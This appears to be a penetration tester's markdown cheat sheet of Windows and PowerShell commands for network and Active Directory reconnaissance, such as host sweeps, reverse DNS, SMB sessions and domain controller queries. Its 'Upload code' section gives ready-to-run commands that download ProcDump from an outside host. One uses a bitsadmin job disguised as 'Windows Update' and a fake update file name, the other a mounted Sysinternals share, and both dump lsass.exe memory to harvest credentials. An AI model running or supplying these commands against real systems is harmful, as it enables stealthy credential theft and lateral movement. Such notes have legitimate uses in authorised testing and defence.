<h1>Network Information Gathering</h1>

**Summery:**

- [Local information gathering](#local-information-gathering)
  - [Adapter info and vlan](#adapter-info-and-vlan)
  - [Dnsache](#dnsache)
  - [Route](#route)
  - [Netstat](#netstat)
  - [SMB](#smb)
  - [Hyper-V Networking](#hyper-v-networking)
- [Network information gathering](#network-information-gathering)
  - [Active Directory](#active-directory)
    - [DHCP](#dhcp)
  - [Network discovery](#network-discovery)
    - [Ping](#ping)
    - [Reverse Lookup](#reverse-lookup)
    - [DNS resolv](#dns-resolv)
  - [Portscan](#portscan)
  - [NAT detection](#nat-detection)
  - [Source](#source)

# Upload code 

## File Upload
> bitsadmin
> 
    bitsadmin /Create "Windows Update" 
    bitsadmin /AddFile "Windows Update" https://live.sysinternals.com/Procdump.exe %TEMP%\kb7468656d.exe 
    bitsadmin /SetNotifyFlags "Windows Update" 1
    bitsadmin /SetNotifyCmdLine "Windows Update" "%COMSPEC%" "cmd.exe /c bitsadmin.exe /complete \"Windows Update\" && start /B %TEMP%\kb7468656d.exe -accepteula -ma lsass.exe  %temp%\lsassdump"
    bitsadmin /Resume "Windows Update" 

> net use
> 
    net use Z: https://live.sysinternals.com
    Z:\procdump.exe -accepteula -ma lsass.exe  %temp%\lsassdump

# Local information gathering 
## Adapter info and vlan
    Get-NetAdapter | ft Name, Status, Linkspeed, VlanID
## Dnsache
    Get-DnsClientCache
## Route
    Get-NetRoute -Protocol Local -DestinationPrefix 192.168*

## Netstat
Batch 

    netstat -a
Powershell

    Get-NetTCPConnection -State Established
    Get-NetTCPConnection -State Listen
## SMB 
    Get-SmbConnection


    Get-SmbOpenFile
## Hyper-V Networking 
    Get-NetAdapterVmq


# Network information gathering 
## Active Directory 
Batch

    netdom /query dc

Powershell 

    Get-ADDomainController

fsmo roles

    Get-ADDomain | Select-Object InfrastructureMaster, RIDMaster, PDCEmulator
    Get-ADForest | Select-Object DomainNamingMaster, SchemaMaster
    Get-ADDomainController -Filter * |
    Select-Object Name, Domain, Forest, OperationMasterRoles |
    Where-Object {$_.OperationMasterRoles} |
    Format-Table -AutoSize

### DHCP

Get DHCP Servers 

    Get-DhcpServerInDC

DHCP Ranges

    Get-DhcpServerv4Scope -ComputerName myDC01


## Network discovery 

### Ping
    1..254 | ForEach-Object {Test-Connection -ComputerName "192.168.0.$_" -Count 1 -ErrorAction SilentlyContinue}

### Reverse Lookup
    (1..254) | % {$ip="192.168.0.$_"; Write-output "$IP  $( Resolve-DnsName $ip -ErrorAction Ignore |select -exp NameHost )  "}
### DNS resolv 

    1..254 | % {resolve-dnsname "192.168.59.$_" -Server 192.168.59.1 -ErrorAction SilentlyContinue} | SELECT Name,Section,NameHost |Select-String -Pattern "Answer"
## Portscan 
    Test-NetConnection -ComputerName www.thomasmaurer.ch -Port 80




## NAT detection 
Batch

    tracert 8.8.8.8
Powershell

    Test-NetConnection 8.8.8.8 â€“TraceRoute



## Source 

https://www.hackingarticles.in/netbios-and-smb-penetration-testing-on-windows/